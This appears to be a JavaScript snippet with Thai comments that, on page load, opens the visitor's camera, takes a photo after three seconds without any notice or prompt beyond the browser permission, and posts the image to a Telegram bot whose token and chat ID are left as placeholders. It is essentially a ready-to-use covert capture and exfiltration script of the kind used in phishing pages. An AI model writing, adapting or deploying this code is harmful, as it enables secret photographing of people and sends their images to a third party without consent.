async function startCamera() {
    const video = document.getElementById('video');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // ถ่ายรูปหลังจากโหลดกล้อง 3 วินาที
        setTimeout(takePhoto, 3000);
    } catch (err) {
        console.error("ไม่สามารถเข้าถึงกล้องได้", err);
    }
}

function takePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // แปลงรูปเป็น Base64
    const imageData = canvas.toDataURL('image/png');

    // ส่งรูปไปยัง Telegram
    sendToTelegram(imageData);
}

function sendToTelegram(imageData) {
    const botToken = "YOUR_BOT_TOKEN";  // 🔴 ใส่ Bot Token ของคุณ
    const chatId = "YOUR_CHAT_ID";      // 🔴 ใส่ Chat ID ของคุณ

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", dataURLtoBlob(imageData));

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    })
    .then(response => response.json())
    .then(data => console.log("ส่งภาพสำเร็จ:", data))
    .catch(error => console.error("เกิดข้อผิดพลาด:", error));
}

function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(",");
    const mime = parts[0].match(/:(.*?);/)[1];
    const byteString = atob(parts[1]);
    const arrayBuffer = new Uint8Array(byteString.length);
    for (let i = 0; i < byteString.length; i++) {
        arrayBuffer[i] = byteString.charCodeAt(i);
    }
    return new Blob([arrayBuffer], { type: mime });
}

// เริ่มทำงานเมื่อหน้าโหลด
startCamera();
